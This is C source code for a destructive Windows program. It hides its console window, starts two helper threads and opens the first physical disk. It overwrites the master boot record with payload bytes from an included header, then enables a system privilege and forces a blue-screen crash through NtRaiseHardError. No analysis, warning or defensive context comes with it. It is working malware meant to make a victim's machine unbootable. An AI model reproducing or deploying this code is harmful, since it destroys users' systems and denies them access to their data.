#include <windows.h>
#include <winable.h>
#include "bootcode.h"
#include "thread.h"
int main () {
	FreeConsole();
	DWORD WINAPI thread(LPVOID parameters);
	DWORD WINAPI Inverter(LPVOID parameters);
	CreateThread(NULL, 0, &thread, NULL, NULL, NULL);
	CreateThread(NULL, 0, &Inverter, NULL, NULL, NULL);
	
	HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, NULL, NULL);
	
	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, BYTES);
	
	for(int i = 0; i < code_len; i++)
	{
		*(bootcode + i) = *(code + i);
	}
	WriteFile(hDrive, bootcode, BYTES, &wb, NULL);
	
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);//raise bsod.
	}
}
